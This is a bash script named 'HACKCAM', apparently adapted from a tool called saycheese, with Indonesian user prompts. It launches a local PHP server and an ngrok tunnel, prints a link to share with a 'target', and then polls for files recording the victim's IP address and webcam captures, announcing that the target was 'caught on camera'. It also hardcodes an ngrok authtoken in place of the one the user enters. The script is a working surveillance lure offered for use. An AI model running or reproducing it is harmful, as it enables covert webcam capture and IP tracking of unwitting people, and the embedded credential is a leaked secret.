# ───────▄▀▀▀▀▀▀▀▀▀▀▄▄
# ────▄▀▀░░░░░░░░░░░░░▀▄
# ──▄▀░░░░░░░░░░░░░░░░░░▀▄
# ──█░░░░░░░░░░░░░░░░░░░░░▀▄
# ─▐▌░░░░░░░░▄▄▄▄▄▄▄░░░░░░░▐▌
# ─█░░░░░░░░░░░▄▄▄▄░░▀▀▀▀▀░░█
# ▐▌░░░░░░░▀▀▀▀░░░░░▀▀▀▀▀░░░▐▌
# █░░░░░░░░░▄▄▀▀▀▀▀░░░░▀▀▀▀▄░█
# █░░░░░░░░░░░░░░░░▀░░░▐░░░░░▐▌
# ▐▌░░░░░░░░░▐▀▀██▄░░░░░░▄▄▄░▐▌
# ─█░░░░░░░░░░░▀▀▀░░░░░░▀▀██░░█
# ─▐▌░░░░▄░░░░░░░░░░░░░▌░░░░░░█
# ──▐▌░░▐░░░░░░░░░░░░░░▀▄░░░░░█
# ───█░░░▌░░░░░░░░▐▀░░░░▄▀░░░▐▌
# ───▐▌░░▀▄░░░░░░░░▀░▀░▀▀░░░▄▀
# ───▐▌░░▐▀▄░░░░░░░░░░░░░░░░█
# ───▐▌░░░▌░▀▄░░░░▀▀▀▀▀▀░░░█
# ───█░░░▀░░░░▀▄░░░░░░░░░░▄▀
# ──▐▌░░░░░░░░░░▀▄░░░░░░▄▀
# ─▄▀░░░▄▀░░░░░░░░▀▀▀▀█▀
# ▀░░░▄▀░░░░░░░░░░▀░░░▀▀▀▀▄▄▄▄▄

save_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

    cat ip.txt >> savedIp.txt
}


banner(){

    isCowsay=0;
    isFortune=0;
    isLolcat=0;
    isFiglet=0;

    command -v cowsay &> /dev/null && isCowsay=1 || isCowsay=0;
    command -v fortune &> /dev/null && isFortune=1 || isFortune=0
    command -v lolcat &> /dev/null && isLolcat=1 || isLolcat=0
    command -v figlet &> /dev/null && isFiglet=1 || isFiglet=0

    if [ $isCowsay -eq 1 ] && [ $isFortune -eq 1 ];
        then
            if [ $isLolcat -eq 1 ]
                then
                    fortune | cowsay -f eyes | lolcat  
                else
                    fortune | cowsay -f eyes
            fi
        else
            cat ./ascii.txt
    fi

    printf "\n"

    if [ $isFiglet -eq 1 ];
        then
            figlet -f Banner "HACKCAM"| lolcat
        else
            printf "\e[1;93m================== \e[0m\e[36mHACKCAM\e[0m \e[1;93m==================\e[0m\n"
    fi

    printf "\n\n"

    if [ $isCowsay -eq 1 ] && [ $isFortune -eq 1 ] && [ $isLolcat -eq 1 ];
        then
            printf "\e[1;93mAuthor: Edwin\nYoutube : edwinify\nGithub : edwindefine\e[0m\n\n\e[1;93mOriginal source: hangetzzu/saycheese \e[0m\n\n" | lolcat
        else
            printf "\e[1;93mAuthor: Edwin\nYoutube : edwinify\nGithub : edwindefine\e[0m\n\n\e[1;93mOriginal source: hangetzzu/saycheese \e[0m\n\n"
    fi

    printf "\e[32m- Pilih START untuk menjalankan server\n- Masukan authtoken ngrok jika diminta\n- Berikutnya share link yang diberikan dan hasil akan ditampilkan di folder ./result \e[0m \n\n"

}

dependencies(){
    command -v php > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan php, silahkan install terlebih dahulu\e[0m\n"; exit 1; }

}

start_server(){
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
}

start_ngrok(){
    if ! [ -f "$HOME/.config/ngrok/ngrok.yml" ]
        then
        read -p $'\e[36m[\e[0m\e[1;77m+\e[0m\e[36m] Masukan ngrok authtoken : \e[0m' ngrok_authtoken
        ./ngrok config add-authtoken 28vedrSJ8DiQBZko3jZRB66V1uY_5QiZaf3xjt3KgLFs3VLGy
    fi
        
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 3
    
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    printf "\e[1;92m[\e[0m-\e[1;92m] Link hackcam:\e[0m\e[1;77m %s\e[0m\n" $link

}

check() {
    # printf "\n"
    printf "\e[1;92m[\e[0m-\e[1;92m] Menunggu target,\e[0m\e[1;77m Tekan Ctrl + C untuk keluar...\e[0m\n"
    while [ true ] 
    do
        if [[ -e "ip.txt" ]]
            then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target mengakses link!\e[0m\n"
            save_ip
            rm -rf ip.txt
        fi
        sleep 0.5

        if [[ -e "Log.log" ]]
            then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Terget tertangkap kamera!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5

    done 

}

run(){
    printf "\e[36m[\e[0m\e[1;77m0\e[0m\e[36m] CANCEL \e[0m\n"
    printf "\e[36m[\e[0m\e[1;77m1\e[0m\e[36m] START \e[0m\n\n"
    read -p $'\e[36m[\e[0m\e[1;77m+\e[0m\e[36m] Masukan opsi : \e[0m' option

    if [ $option -eq 0 ]
        then
            printf "\n\e[1;93m[!] CANCELED\e[0m\n";
    elif [ $option -eq 1 ]
        then
            start_server
            start_ngrok
            check
    else 
        printf "\n\e[31m[!] SILAKAN MASUKAN PARAMETER YANG BENAR\e[0m\n"
        sleep 1
        clear
        run
    fi
}

clear

banner
dependencies
run